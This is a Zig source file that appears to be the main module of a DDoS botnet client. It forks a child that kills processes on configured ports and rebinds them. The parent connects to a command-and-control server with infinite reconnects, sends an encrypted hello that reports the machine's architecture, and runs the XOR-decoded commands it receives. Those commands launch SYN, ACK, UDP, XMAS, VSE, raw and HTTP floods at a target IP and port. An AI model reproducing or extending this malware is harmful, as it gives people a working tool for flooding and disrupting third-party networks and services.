const std = @import("std");
const linux = std.os.linux;

const helpers = @import("helpers.zig");
const enc = @import("enc.zig");

const HELLO_SIGN = "0x0172737723782";
const DISCONNECT_SIGN = "0x0127husfsuyfsy23786r228ruifhwuif";

var gpa = std.heap.GeneralPurposeAllocator(.{}){};
const allocator = gpa.allocator();

// attack methods
const xmas = @import("attack/xmas.zig");
const udp = @import("attack/udp.zig");
const syn = @import("attack/syn.zig");
const ack = @import("attack/ack.zig");
const vse = @import("attack/vse.zig");
const raw = @import("attack/raw.zig");
const http = @import("attack/http.zig");

const Killer = @import("Killer.zig");
const conf = @import("conf.zig");

// reconnect config
const RECONNECT_BASE_DELAY = 2 * std.time.ns_per_s;
const RECONNECT_MAX_DELAY = 120 * std.time.ns_per_s;
const RECONNECT_MAX_RETRIES = 0; // 0 = infinite

pub fn main() void {
    const pid = helpers.fork() catch |err| {
        std.debug.print("fork err: {s}\n", .{@errorName(err)});
        linux.exit(1);
    };

    if (pid == 0) {
        if (conf.KILLER) {
            const killer = Killer.init(allocator);

            for (conf.KILL_PORTS) |port| {
                killer.killByPort(port) catch unreachable;
            }
            for (conf.REBIND_PORTS) |port| {
                killer.rebind(port) catch unreachable;
            }
        }
    } else {
        reconnectLoop();
    }

    linux.exit(0);
}

fn reconnectLoop() void {
    var delay: u64 = RECONNECT_BASE_DELAY;
    var retries: u32 = 0;

    while (RECONNECT_MAX_RETRIES == 0 or retries < RECONNECT_MAX_RETRIES) {
        connect() catch |err| switch (err) {
            error.ConnectionResetByPeer => {
                std.debug.print("[!] disconnected by server\n", .{});
                // server kicked us, reset delay and try again
                delay = RECONNECT_BASE_DELAY;
            },
            else => {
                std.debug.print("[!] connection error: {s}, retrying in {d}s\n", .{
                    @errorName(err),
                    delay / std.time.ns_per_s,
                });
            },
        };

        retries += 1;
        std.time.sleep(delay);

        // exponential backoff with cap
        delay = @min(delay * 2, RECONNECT_MAX_DELAY);
    }
}

pub fn connect() !void {
    std.debug.print("[*] connecting to C2...\n", .{});

    const fd = linux.socket(linux.AF.INET, linux.SOCK.STREAM, 0);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init([4]u8{ 127, 0, 0, 1 }, 8081) };

    helpers.connect(@intCast(fd), &sockaddr.any, @sizeOf(linux.sockaddr)) catch |err| {
        std.debug.print("[!] connect err: {s}\n", .{@errorName(err)});
        return err;
    };

    std.debug.print("[+] connected\n", .{});

    // send hello msg
    {
        const hello_msg = comptime HELLO_SIGN ++ "|" ++ helpers.getArch();

        const encrypted = enc.enc(allocator, hello_msg, 10);

        _ = try helpers.sendto(
            @intCast(fd),
            @ptrCast(encrypted),
            encrypted.len,
            0,
            &sockaddr.any,
            @sizeOf(linux.sockaddr),
        );
        allocator.free(encrypted);

        var buf: [1024]u8 = undefined;

        while (true) {
            const n = helpers.recvfrom(@intCast(fd), &buf, buf.len, 0, null, null) catch |err| {
                std.debug.print("[!] recv err: {s}\n", .{@errorName(err)});
                return err;
            };

            if (n == 0) {
                return error.ConnectionResetByPeer;
            }

            if (std.mem.eql(u8, buf[0..n], DISCONNECT_SIGN)) {
                return error.ConnectionResetByPeer;
            }

            const payload_xor = buf[0..n];
            const payload = enc.dec(allocator, payload_xor);
            defer allocator.free(payload);

            std.debug.print("[*] cmd: {s}\n", .{payload});

            handleCommand(payload);
        }
    }
}

fn handleCommand(payload: []const u8) void {
    var it = std.mem.splitScalar(u8, payload, ' ');

    const cmd = it.next() orelse return;
    const ip_str = it.next() orelse return;
    const port_str = it.next() orelse return;
    const dur_str = it.next() orelse return;

    const ip = helpers.parseIp(ip_str);
    const port = std.fmt.parseInt(u16, port_str, 10) catch return;
    const duration = std.fmt.parseInt(u32, dur_str, 10) catch return;

    if (std.mem.eql(u8, cmd, "xmas")) {
        xmas.xmas(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "syn")) {
        syn.syn(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "ack")) {
        ack.ack(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "udp")) {
        udp.udp(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "vse")) {
        vse.vse(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "raw")) {
        raw.raw(allocator, ip, port, duration);
    } else if (std.mem.eql(u8, cmd, "http")) {
        http.http_flood(allocator, ip, port, duration);
    }
}
